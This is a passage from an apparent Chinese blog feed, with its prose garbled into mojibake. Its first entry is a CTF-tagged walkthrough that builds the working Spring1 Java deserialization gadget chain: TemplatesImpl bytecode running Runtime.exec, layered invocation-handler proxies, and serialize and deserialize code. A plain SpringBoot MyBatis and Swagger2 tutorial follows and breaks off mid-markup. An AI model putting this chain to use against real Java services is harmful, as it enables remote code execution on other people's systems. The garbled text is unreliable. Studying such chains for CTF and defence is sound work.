class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">spring.setSuperclass(superClass);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br></pre></td></tr></table></figure><p>æ„é€ ç¬¬ä¸€å±‚ä»£ç†ï¼Œåœ¨è°ƒç”¨<code>getObject()</code>æ–¹æ³•æ—¶è¿”å›<code>templates</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br></pre></td></tr></table></figure><p>æ„é€ ç¬¬äºŒå±‚ä»£ç†ï¼Œåœ¨è°ƒç”¨<code>newTransformer()</code>æ–¹æ³•æ—¶å»è°ƒç”¨ç¬¬ä¸€å±‚ä»£ç†çš„<code>getObject()</code>æ–¹æ³•ï¼Œæ•…è¦è®©<code>objectFactory</code>å±æ€§ä¸ºå‰é¢æ„é€ çš„<code>handler01</code>ï¼Œå¹¶ä¸”è¯¥ä»£ç†å¯¹è±¡åŒæ—¶å®ç°<code>Type</code>å’Œ<code>Templates</code>æ¥å£ä»¥æ»¡è¶³è¿”å›å€¼è¦æ±‚å’Œ<code>newTransformer()</code>æ–¹æ³•çš„å“åº”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line"><span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br></pre></td></tr></table></figure><p>æ„é€ ç¬¬ä¸‰å±‚ä»£ç†ï¼Œåœ¨è°ƒç”¨<code>getType()</code>æ–¹æ³•æ—¶è¿”å›<code>proxy02</code>ï¼Œç”±äº<code>TypeProvider</code>æ¥å£ä¸ºåŒ…ç§æœ‰ï¼Œéœ€è¦å…ˆç›´æ¥è·å–ç±»ï¼Œå†ä¼ å…¥ï¼ŒåŒæ—¶ä»£ç†å¯¹è±¡<code>proxy03</code>ä¹Ÿæ˜¯åªèƒ½å£°æ˜ä¸º<code>Object</code>ç±»å‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br></pre></td></tr></table></figure><p>ç”±äºå…¥å£ç±»æ˜¯<code>MethodInvokeTypeProvider</code>ï¼Œæˆ‘ä»¬è¦åˆ›å»ºè¯¥ç±»å®ä¾‹ï¼Œå¹¶è®©<code>this.methodName</code>ä¸º<code>&quot;newTransformer&quot;</code>ï¼Œæ„é€ å™¨éœ€è¦ä¸€ä¸ª<code>Method</code>å¯¹è±¡ï¼Œå…ˆéšä¾¿ä¼ ï¼Œåé¢å†é€šè¿‡åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒSpring1åŸç”Ÿååºåˆ—åŒ–é“¾æ„å»ºå®Œæ¯•ï¼Œå…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringSerialTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        spring.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">        constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">        ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">        constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line">        <span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(methodInvokeTypeProvider);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootç¬¬äºŒéƒ¨åˆ†</title>
      <link href="/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/"/>
      <url>/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBootç¬¬äºŒéƒ¨åˆ†"><a href="#SpringBootç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="SpringBootç¬¬äºŒéƒ¨åˆ†"></a>SpringBootç¬¬äºŒéƒ¨åˆ†</h1><br/><h2 id="Mybatisæ¡†æ¶é›†æˆ"><a href="#Mybatisæ¡†æ¶é›†æˆ" class="headerlink" title="Mybatisæ¡†æ¶é›†æˆ"></a>Mybatisæ¡†æ¶é›†æˆ</h2><p>Mybatisæ˜¯ä½œç”¨äºæŒä¹…å±‚çš„çš„æ¡†æ¶ï¼Œä¸»è¦ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥ç®€åŒ–ç¨‹åºç¼–å†™æ—¶ä¸æ•°æ®åº“çš„äº¤äº’</p><h3 id="é…ç½®ä¸å®ç°"><a href="#é…ç½®ä¸å®ç°" class="headerlink" title="é…ç½®ä¸å®ç°"></a>é…ç½®ä¸å®ç°</h3><p>é…ç½®ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis é›†æˆ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- springboot åˆ†é¡µæ’ä»¶ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- mysql é©±åŠ¨ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- c3p0 æ•°æ®æº --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®<code>application.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ•°æ®æºé…ç½®</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.mchange.v2.c3p0.ComboPooledDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/DBName?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mybatis é…ç½®</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:/mappers/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.xxxk.springframework.po</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment">## ä¸‹åˆ’çº¿è½¬é©¼å³°é…ç½®</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pagehelper</span></span><br><span class="line"><span class="attr">pagehelper:</span></span><br><span class="line">  <span class="attr">helper-dialect:</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure><p>Mybatisé€šè¿‡XMLæ–‡ä»¶é…ç½®ä¸æ¥å£çš„æ˜ å°„æ‰§è¡Œsqlè¯­å¥ï¼Œåœ¨<code>resources/mappers</code>ç›®å½•ä¸‹æ·»åŠ xmlé…ç½®ï¼Œ<code>id</code>å±æ€§ä¸æ¥å£æ–¹æ³•åå¯¹åº”</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.xxxx.springboot.dao.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByUserName&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    select</span><br><span class="line">    id,user_name,user_pwd</span><br><span class="line">    from tb_user</span><br><span class="line">    where user_name=#&#123;userName&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">queryUserByUserName</span><span class="params">(String userName)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Serviceå±‚æ³¨å…¥æ¥å£è°ƒç”¨æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">queryUserByUserName</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryUserByUserName(userName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åçš„å¯åŠ¨ç±»éœ€è¦<code>@MapperScan</code>æ‰«ææŒ‡å®šåŒ…ä¸­åˆ›å»ºçš„æ¥å£</p><p>å¯¹äºåˆ†é¡µæŸ¥è¯¢ï¼Œå°†æŸ¥è¯¢çš„å‚æ•°å°è£…åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserQuery</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectByParams</span><span class="params">(UserQuery userQuery)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®XMLæ˜ å°„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.xxxx.springboot.dao.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;selectByParams&quot;</span> parameterType=<span class="string">&quot;com.xxxx.springboot.query.UserQuery&quot;</span></span><br><span class="line">    resultType=<span class="string">&quot;com.xxxx.springboot.po.User&quot;</span>&gt;</span><br><span class="line">    select</span><br><span class="line">    *</span><br><span class="line">    from</span><br><span class="line">    tb_user</span><br><span class="line">    &lt;where&gt;</span><br><span class="line">    &lt;<span class="keyword">if</span> test=<span class="string">&quot;null != userName and userName !=&#x27;&#x27;&quot;</span>&gt;</span><br><span class="line">    and user_name like <span class="title function_">concat</span><span class="params">(<span class="string">&#x27;%&#x27;</span>,#&#123;userName&#125;, <span class="string">&#x27;%&#x27;</span>)</span></span><br><span class="line">    &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">    &lt;/where&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure><p>Serviceå±‚è¿›è¡Œå¯¹åº”å®ç°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PageInfo&lt;User&gt; <span class="title function_">queryUserByParams</span><span class="params">(UserQuery userQuery)</span>&#123;</span><br><span class="line">        PageHelper.startPage(userQuery.getPageNum(), userQuery.getPageSize());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;User&gt;(userMapper.selectByParams(userQuery));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Swagger2æ–‡æ¡£æ„å»º"><a href="#Swagger2æ–‡æ¡£æ„å»º" class="headerlink" title="Swagger2æ–‡æ¡£æ„å»º"></a>Swagger2æ–‡æ¡£æ„å»º</h2><p>åœ¨ Spring Boot å¤šç»ˆç«¯é¡¹ç›®ä¸­ï¼Œé€šå¸¸ä½¿ç”¨ä¸€å¥— API æ¥å£ä¸ºä¸åŒç»ˆç«¯æä¾›æœåŠ¡ã€‚ä¸ºæ–¹ä¾¿è”è°ƒæµ‹è¯•ï¼Œåç«¯éœ€æä¾›æ¥å£æ–‡æ¡£ï¼Œå¯é€šè¿‡ Swagger2 è‡ªåŠ¨ç”Ÿæˆï¼Œå…å»æ‰‹åŠ¨ç¼–å†™æ–‡æ¡£çš„ç¹ç</p><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>é…ç½®ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span 